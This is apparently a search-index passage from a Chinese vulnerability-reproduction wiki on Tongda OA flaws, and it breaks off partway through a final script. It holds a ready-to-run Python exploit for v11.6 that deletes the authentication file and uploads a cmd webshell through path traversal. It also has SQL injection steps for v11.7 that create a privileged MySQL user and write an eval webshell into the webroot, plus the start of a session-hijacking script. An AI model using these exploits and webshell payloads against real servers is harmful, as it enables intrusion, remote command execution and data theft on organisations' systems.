\u6587\u4ef6\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1 \u5224\u65ad\u53d8\u91cf $action \u662f\u5426\u4e3a upload\uff0c\u518d\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\uff0c\u5982\u679c\u4e0d\u4e3a xls \u548c img \u5219\u8fdb\u5165else\u5206\u652f else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") && ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i < count($arr); $i++) { $p = strpos($arr[$i], \".\"); $repno = substr($arr[$i], 0, $p); $repkid = GetRepKIDByNo($repno); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); break; } } } } } else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } } @unlink($_FILES[\"FILE1\"]); } \u5728\u8fd9\u6bb5\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e0d\u5b58\u5728 $from_rep \u53d8\u91cf\u5219\u4f1a\u8df3\u5230\u5982\u4e0b\u4ee3\u7801 else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } \u8fd9\u91cc\u76f4\u63a5\u5c06 $repkid \u53d8\u91cf\u8fdb\u884c\u62fc\u63a5,\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u901a\u8fc7\u76ee\u5f55\u7a7f\u8d8a\u6765\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u5230\u6307\u5b9a\u76ee\u5f55 [!NOTE] \u8fd9\u91cc\u9700\u8981\u5229\u7528file_exists\u51fd\u6570\u7684\u6f0f\u6d1e\u6784\u9020/.<>./.<>./.<>./ \u9003\u9038\u51fa\u6765 \u4f7f\u7528POC\u6765\u5229\u7528\u6f0f\u6d1e [!NOTE] \u6ce8\u610f\u5728\u5220\u9664\u9a8c\u8bc1\u8eab\u4efd\u7684\u6587\u4ef6\u540e\uff0c\u4f1a\u9020\u6210\u540e\u53f0\u9875\u9762\u51fa\u73b0\u5982\u4e0b\u56fe\uff0c\u4f7f\u7528\u524d\u5907\u4efd\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA v11.6 \u4efb\u610f\u6587\u4ef6\u5220\u9664&RCE \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): check_url = target_url + \"/module/appbuilder/assets/print.php\" try : check_url_response = requests . get ( url = check_url ) if check_url_response . status_code == 200 : print ( \" \\033 [32m[o] \u5b58\u5728 /module/appbuilder/assets/print.php \u53ef\u80fd\u542b\u6709\u901a\u8fbeOA v11.6 \u4efb\u610f\u6587\u4ef6\u5220\u9664&RCE\u6f0f\u6d1e \\033 [0m\" ) input ( \" \\033 [32m[o] \u6b64\u6f0f\u6d1e\u4f1a\u5bf9\u771f\u5b9e\u73af\u5883\u9020\u6210\u5f71\u54cd\uff0c\u8bf7\u5728\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u6309\u4e0b\u4efb\u610f\u952e\u7ee7\u7eed..... \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728 /module/appbuilder/assets/print.php \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_2 ( target_url ): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try : unlink_response = requests . get ( url = unlink_url ) if unlink_response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5220\u9664\u6821\u9a8c\u6587\u4ef6 auth.inc.php \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u5220\u9664\u6821\u9a8c\u6587\u4ef6 auth.inc.php \u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_3 ( target_url , payload_php ): \"\"\" (\u7ed5\u8fc7\u7684webshell) <?php $command=$_GET['peiqi']; $wsh = new COM('WScript.shell'); $exec = $wsh->exec(\"cmd /c \".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload&filetype=peiqi&repkid=/.<>./.<>./.<>./\" files = { 'FILE1' : ( 'peiqi.php' , payload_php )} try : vuln_response = requests . post ( url = vuln_url , files = files ) if vuln_response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5199\u5165webshell\u6587\u4ef6: _peiqi.php \\033 [0m\" ) print ( \" \\033 [32m[o] webshell\u5730\u5740\u4e3a: {} /_peiqi.php \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u5199\u5165webshell\u6587\u4ef6\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_4 ( target_url , cmd ): cmd_url = target_url + \"/_peiqi.php?peiqi= {} \" . format ( cmd ) try : cmd_response = requests . get ( url = cmd_url ) if cmd_response . status_code == 200 : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884c\u547d\u4ee4: {} \\033 [0m\" . format ( cmd_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( cmd_response . text )) else : print ( \" \\033 [31m[x] \u547d\u4ee4\u6267\u884c\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) POC_2 ( target_url ) payload_php = base64 . b64decode ( \"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWydwZWlxaSddOwogICAgJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKICAgICRleGVjID0gJHdzaC0+ZXhlYygiY21kIC9jICIuJGNvbW1hbmQpOwogICAgJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKICAgICRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CiAgICBlY2hvICRzdHJvdXRwdXQ7Cj8+\" ) . decode ( \"utf-8\" ) POC_3 ( target_url , payload_php ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_4 ( target_url , cmd )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/","text":"\u901a\u8fbeOA v11.7\u540e\u53f0SQL\u6ce8\u5165 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fbeOA v11.7\u540e\u53f0\u5b58\u5728SQL\u6ce8\u5165\uff0c\u53ef\u901a\u8fc7\u6b64\u6f0f\u6d1e\u5199\u5165\u6076\u610f\u540e\u95e8\u6587\u4ef6\u653b\u51fb\u76ee\u6807\u670d\u52a1\u5668 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u901a\u8fbeOA v11.7 \u73af\u5883\u642d\u5efa \u00b6 \u73af\u5883\u5730\u5740 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5728 general/hr/manage/query/delete_cascade.php \u6587\u4ef6\u4e2d \u9996\u5148\u5224\u65ad $condition_cascade \u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u5219\u5c06\u5176\u4e2d\u7684 \\' \u66ff\u6362\u4e3a ' \u3002\u4e3a\u4ec0\u4e48\u8981\u8fd9\u6837\u66ff\u6362\u5462\uff0c\u4e3b\u8981\u662f\u56e0\u4e3aV11.7\u7248\u672c\u4e2d\uff0c\u6ce8\u518c\u53d8\u91cf\u65f6\u8003\u8651\u4e86\u5b89\u5168\u95ee\u9898\uff0c\u5c06\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u7528 addslashes \u51fd\u6570\u8fdb\u884c\u4fdd\u62a4\uff0c\u5982\u4e0b\uff1a **inc/common.inc.php **\u4ee3\u7801 \u4f7f\u7528\u76f2\u6ce8\u5bf9SQL\u6ce8\u5165\u8fdb\u884c\u6d4b\u8bd5 \u89e6\u53d1\u4e86\u901a\u8fbeOA\u7684SQL\u6ce8\u5165\u62e6\u622a **inc/conn.php**\u6587\u4ef6\u4e2d\u627e\u5230\u8fc7\u6ee4\u673a\u5236\u5982\u4e0b: \u5176\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u5b57\u7b26\uff0c\u4f46\u662f\u5e76\u975e\u65e0\u6cd5\u7ed5\u8fc7\uff0c\u76f2\u6ce8\u7684\u6838\u5fc3\u662f\uff1a substr\u3001if \u7b49\u51fd\u6570\uff0c\u5747\u672a\u88ab\u8fc7\u6ee4\uff0c\u90a3\u4e48\u53ea\u8981\u6784\u9020MySQL\u62a5\u9519\u5373\u53ef\u914d\u5408 if \u51fd\u6570\u8fdb\u884c\u76f2\u6ce8\u4e86\uff0c\u7ffb\u770b\u5c40\u5916\u4eba\u5e08\u5085\u5728\u8865\u5929\u767d\u5e3d\u5927\u4f1a\u4e0a\u7684\u5206\u4eab\uff0c\u53d1\u73b0 power(9999,99) \u4e5f\u53ef\u4ee5\u4f7f\u6570\u636e\u5e93\u62a5\u9519\uff0c\u6240\u4ee5\u6784\u9020\u8bed\u53e5\uff1a select if (( substr ( user (), 1 , 1 ) = 'r' ), 1 , power ( 9999 , 99 )) # \u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 \u6dfb\u52a0SQL\u6570\u636e\u5e93\u7528\u6237 grant all privileges ON mysql . * TO 'peiqi' @ '%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION \u8bbf\u95ee http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION \u8fdb\u5165 Myoa/mysql5/bin \u76ee\u5f55 \u6267\u884c mysql -upeiqi -p \u8f93\u5165\u5bc6\u7801\u67e5\u8be2\u6240\u6709\u7528\u6237 \u53d1\u73b0\u6210\u529f\u6267\u884c\u6dfb\u52a0\u4e00\u4e2a\u8d26\u6237 \u7136\u540e\u8be5\u7528\u6237\u662f\u5bf9mysql\u6570\u636e\u5e93\u62e5\u6709\u6240\u6709\u6743\u9650\u7684,\u7136\u540e\u7ed9\u81ea\u5df1\u52a0\u6743\u9650\uff1a UPDATE ` mysql ` . ` user ` SET ` Password ` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D' , ` Select_priv ` = 'Y' , ` Insert_priv ` = 'Y' , ` Update_priv ` = 'Y' , ` Delete_priv ` = 'Y' , ` Create_priv ` = 'Y' , ` Drop_priv ` = 'Y' , ` Reload_priv ` = 'Y' , ` Shutdown_priv ` = 'Y' , ` Process_priv ` = 'Y' , ` File_priv ` = 'Y' , ` Grant_priv ` = 'Y' , ` References_priv ` = 'Y' , ` Index_priv ` = 'Y' , ` Alter_priv ` = 'Y' , ` Show_db_priv ` = 'Y' , ` Super_priv ` = 'Y' , ` Create_tmp_table_priv ` = 'Y' , ` Lock_tables_priv ` = 'Y' , ` Execute_priv ` = 'Y' , ` Repl_slave_priv ` = 'Y' , ` Repl_client_priv ` = 'Y' , ` Create_view_priv ` = 'Y' , ` Show_view_priv ` = 'Y' , ` Create_routine_priv ` = 'Y' , ` Alter_routine_priv ` = 'Y' , ` Create_user_priv ` = 'Y' , ` Event_priv ` = 'Y' , ` Trigger_priv ` = 'Y' , ` Create_tablespace_priv ` = 'Y' , ` ssl_type ` = '' , ` ssl_cipher ` = '' , ` x509_issuer ` = '' , ` x509_subject ` = '' , ` max_questions ` = 0 , ` max_updates ` = 0 , ` max_connections ` = 0 , ` max_user_connections ` = 0 , ` plugin ` = 'mysql_native_password' , ` authentication_string ` = '' , ` password_expired ` = 'Y' WHERE ` Host ` = Cast ( '%' AS Binary ( 1 )) AND ` User ` = Cast ( 'peiqi' AS Binary ( 5 )); \u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684\uff1a general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; \u8fd9\u6837\u5c31\u62e5\u6709\u4e86\u6240\u6709\u6743\u9650 \u767b\u5f55\u5982\u679c\u5931\u8d25\uff0c\u6267\u884c grant all privileges ON mysql . * TO 'peiqi' @ '%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION \u5229\u7528\u6f0f\u6d1e\u5199shell # \u67e5\u8def\u5f84\uff1a select @@ basedir ; # F : \\ OA \\ mysql5 \\\uff0c\u90a3\u4e48 web\u76ee\u5f55\u5c31\u662f F : / OA / webroot / # \u65b9\u6cd5 1 \uff1a set global slow_query_log = on ; set global slow_query_log_file = 'F:/OA/webroot/' ; select '<?php eval($_POST[x]);?>' or sleep ( 11 ); # \u65b9\u6cd5 2 \uff1a set global general_log = on ; set global general_log_file = 'F:/OA/webroot/' ; select '<?php eval($_POST[x]);?>' ; show variables like '%general%' ; \u4e0a\u4f20\u5927\u9a6c \u53c2\u8003\u6587\u7ae0 \u00b6 \u901a\u8fbeOA v11.7\u540e\u53f0SQL\u6ce8\u5165\u5230RCE[0day]","title":"\u901a\u8fbeOA v11.7 \u540e\u53f0SQL\u6ce8\u5165"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u901a\u8fbeoa-v117\u540e\u53f0sql\u6ce8\u5165","text":"","title":"\u901a\u8fbeOA v11.7\u540e\u53f0SQL\u6ce8\u5165"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fbeOA v11.7\u540e\u53f0\u5b58\u5728SQL\u6ce8\u5165\uff0c\u53ef\u901a\u8fc7\u6b64\u6f0f\u6d1e\u5199\u5165\u6076\u610f\u540e\u95e8\u6587\u4ef6\u653b\u51fb\u76ee\u6807\u670d\u52a1\u5668","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u901a\u8fbeOA v11.7","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u73af\u5883\u642d\u5efa","text":"\u73af\u5883\u5730\u5740","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5728 general/hr/manage/query/delete_cascade.php \u6587\u4ef6\u4e2d \u9996\u5148\u5224\u65ad $condition_cascade \u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u5219\u5c06\u5176\u4e2d\u7684 \\' \u66ff\u6362\u4e3a ' \u3002\u4e3a\u4ec0\u4e48\u8981\u8fd9\u6837\u66ff\u6362\u5462\uff0c\u4e3b\u8981\u662f\u56e0\u4e3aV11.7\u7248\u672c\u4e2d\uff0c\u6ce8\u518c\u53d8\u91cf\u65f6\u8003\u8651\u4e86\u5b89\u5168\u95ee\u9898\uff0c\u5c06\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u7528 addslashes \u51fd\u6570\u8fdb\u884c\u4fdd\u62a4\uff0c\u5982\u4e0b\uff1a **inc/common.inc.php **\u4ee3\u7801 \u4f7f\u7528\u76f2\u6ce8\u5bf9SQL\u6ce8\u5165\u8fdb\u884c\u6d4b\u8bd5 \u89e6\u53d1\u4e86\u901a\u8fbeOA\u7684SQL\u6ce8\u5165\u62e6\u622a **inc/conn.php**\u6587\u4ef6\u4e2d\u627e\u5230\u8fc7\u6ee4\u673a\u5236\u5982\u4e0b: \u5176\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u5b57\u7b26\uff0c\u4f46\u662f\u5e76\u975e\u65e0\u6cd5\u7ed5\u8fc7\uff0c\u76f2\u6ce8\u7684\u6838\u5fc3\u662f\uff1a substr\u3001if \u7b49\u51fd\u6570\uff0c\u5747\u672a\u88ab\u8fc7\u6ee4\uff0c\u90a3\u4e48\u53ea\u8981\u6784\u9020MySQL\u62a5\u9519\u5373\u53ef\u914d\u5408 if \u51fd\u6570\u8fdb\u884c\u76f2\u6ce8\u4e86\uff0c\u7ffb\u770b\u5c40\u5916\u4eba\u5e08\u5085\u5728\u8865\u5929\u767d\u5e3d\u5927\u4f1a\u4e0a\u7684\u5206\u4eab\uff0c\u53d1\u73b0 power(9999,99) \u4e5f\u53ef\u4ee5\u4f7f\u6570\u636e\u5e93\u62a5\u9519\uff0c\u6240\u4ee5\u6784\u9020\u8bed\u53e5\uff1a select if (( substr ( user (), 1 , 1 ) = 'r' ), 1 , power ( 9999 , 99 )) # \u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 \u6dfb\u52a0SQL\u6570\u636e\u5e93\u7528\u6237 grant all privileges ON mysql . * TO 'peiqi' @ '%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION \u8bbf\u95ee http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION \u8fdb\u5165 Myoa/mysql5/bin \u76ee\u5f55 \u6267\u884c mysql -upeiqi -p \u8f93\u5165\u5bc6\u7801\u67e5\u8be2\u6240\u6709\u7528\u6237 \u53d1\u73b0\u6210\u529f\u6267\u884c\u6dfb\u52a0\u4e00\u4e2a\u8d26\u6237 \u7136\u540e\u8be5\u7528\u6237\u662f\u5bf9mysql\u6570\u636e\u5e93\u62e5\u6709\u6240\u6709\u6743\u9650\u7684,\u7136\u540e\u7ed9\u81ea\u5df1\u52a0\u6743\u9650\uff1a UPDATE ` mysql ` . ` user ` SET ` Password ` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D' , ` Select_priv ` = 'Y' , ` Insert_priv ` = 'Y' , ` Update_priv ` = 'Y' , ` Delete_priv ` = 'Y' , ` Create_priv ` = 'Y' , ` Drop_priv ` = 'Y' , ` Reload_priv ` = 'Y' , ` Shutdown_priv ` = 'Y' , ` Process_priv ` = 'Y' , ` File_priv ` = 'Y' , ` Grant_priv ` = 'Y' , ` References_priv ` = 'Y' , ` Index_priv ` = 'Y' , ` Alter_priv ` = 'Y' , ` Show_db_priv ` = 'Y' , ` Super_priv ` = 'Y' , ` Create_tmp_table_priv ` = 'Y' , ` Lock_tables_priv ` = 'Y' , ` Execute_priv ` = 'Y' , ` Repl_slave_priv ` = 'Y' , ` Repl_client_priv ` = 'Y' , ` Create_view_priv ` = 'Y' , ` Show_view_priv ` = 'Y' , ` Create_routine_priv ` = 'Y' , ` Alter_routine_priv ` = 'Y' , ` Create_user_priv ` = 'Y' , ` Event_priv ` = 'Y' , ` Trigger_priv ` = 'Y' , ` Create_tablespace_priv ` = 'Y' , ` ssl_type ` = '' , ` ssl_cipher ` = '' , ` x509_issuer ` = '' , ` x509_subject ` = '' , ` max_questions ` = 0 , ` max_updates ` = 0 , ` max_connections ` = 0 , ` max_user_connections ` = 0 , ` plugin ` = 'mysql_native_password' , ` authentication_string ` = '' , ` password_expired ` = 'Y' WHERE ` Host ` = Cast ( '%' AS Binary ( 1 )) AND ` User ` = Cast ( 'peiqi' AS Binary ( 5 )); \u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684\uff1a general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; \u8fd9\u6837\u5c31\u62e5\u6709\u4e86\u6240\u6709\u6743\u9650 \u767b\u5f55\u5982\u679c\u5931\u8d25\uff0c\u6267\u884c grant all privileges ON mysql . * TO 'peiqi' @ '%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION \u5229\u7528\u6f0f\u6d1e\u5199shell # \u67e5\u8def\u5f84\uff1a select @@ basedir ; # F : \\ OA \\ mysql5 \\\uff0c\u90a3\u4e48 web\u76ee\u5f55\u5c31\u662f F : / OA / webroot / # \u65b9\u6cd5 1 \uff1a set global slow_query_log = on ; set global slow_query_log_file = 'F:/OA/webroot/' ; select '<?php eval($_POST[x]);?>' or sleep ( 11 ); # \u65b9\u6cd5 2 \uff1a set global general_log = on ; set global general_log_file = 'F:/OA/webroot/' ; select '<?php eval($_POST[x]);?>' ; show variables like '%general%' ; \u4e0a\u4f20\u5927\u9a6c","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#\u53c2\u8003\u6587\u7ae0","text":"\u901a\u8fbeOA v11.7\u540e\u53f0SQL\u6ce8\u5165\u5230RCE[0day]","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"\u901a\u8fbeOA v11.7 \u5728\u7ebf\u7528\u6237\u767b\u5f55\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fbeOA v11.7 \u4e2d\u5b58\u5728\u67d0\u63a5\u53e3\u67e5\u8be2\u5728\u7ebf\u7528\u6237\uff0c\u5f53\u7528\u6237\u5728\u7ebf\u65f6\u4f1a\u8fd4\u56de PHPSESSION\u4f7f\u5176\u53ef\u767b\u5f55\u540e\u53f0\u7cfb\u7edf \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u901a\u8fbeOA < v11.7 \u73af\u5883\u642d\u5efa \u00b6 \u901a\u8fbeOA v11.7\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u540e\u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u6709\u5173\u6587\u4ef6 MYOA\\webroot\\mobile\\auth_mobi.php <?php function relogin () { echo _ ( 'RELOGIN' ); exit ; } ob_start (); include_once 'inc/session.php' ; include_once 'inc/conn.php' ; include_once 'inc/utility.php' ; if ( $isAvatar == '1' && $uid != '' && $P_VER != '' ) { $sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . '\\' and CLIENT = \\'' . $P_VER . '\\'' ; $cursor = exequery ( TD :: conn (), $sql ); if ( $row = mysql_fetch_array ( $cursor )) { $P = $row [ 'SID' ]; } } if ( $P == '' ) { $P = $_COOKIE [ 'PHPSESSID' ]; if ( $P == '' ) { relogin (); exit ; } } if ( preg_match ( '/[^a-z0-9;]+/i' , $P )) { echo _ ( '\u975e\u6cd5\u53c2\u6570' ); exit ; } if ( strpos ( $P , ';' ) !== false ) { $MY_ARRAY = explode ( ';' , $P ); $P = trim ( $MY_ARRAY [ 1 ]); } session_id ( $P ); session_start (); session_write_close (); if ( $_SESSION [ 'LOGIN_USER_ID' ] == '' || $_SESSION [ 'LOGIN_UID' ] == '' ) { relogin (); } \u5728\u6267\u884c\u7684 SQL\u8bed\u53e5\u4e2d $ sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . ' \\ ' and CLIENT = \\'' . $P_VER . ' \\ '' ; \u7b80\u5355\u9605\u8bfbPHP\u6e90\u7801\u53ef\u4ee5\u77e5\u9053 \u6b64SQL\u8bed\u53e5\u4f1a\u67e5\u8be2\u7528\u6237\u662f\u5426\u5728\u7ebf\uff0c\u5982\u5728\u7ebf\u8fd4\u56de\u6b64\u7528\u6237 Session ID \u5c06\u8fd4\u56de\u7684 Set-Cookie \u4e2d\u7684Cookie\u53c2\u6570\u503c\u4f7f\u7528\u4e8e\u767b\u5f55Cookie \u8bbf\u95ee\u76ee\u6807\u540e\u53f0 http://xxx.xxx.xxx.xxx/general/ \u5f53\u76ee\u6807\u79bb\u7ebf\u65f6\u5219\u8bbf\u95ee\u6f0f\u6d1e\u9875\u9762\u5219\u4f1a\u51fa\u73b0\u5982\u4e0b\u56fe [!NOTE] \u901a\u8fc7\u6b64\u601d\u8def\u53ef\u4ee5\u6301\u7eed\u53d1\u5305\u76d1\u63a7\u6b64\u9875\u9762\u6765\u83b7\u53d6\u5728\u7ebf\u7528\u6237\u7684Cookie \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] 5\u79d2\u4e00\u6b21\u6d4b\u8bd5\u7528\u6237\u662f\u5426\u5728\u7ebf import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( 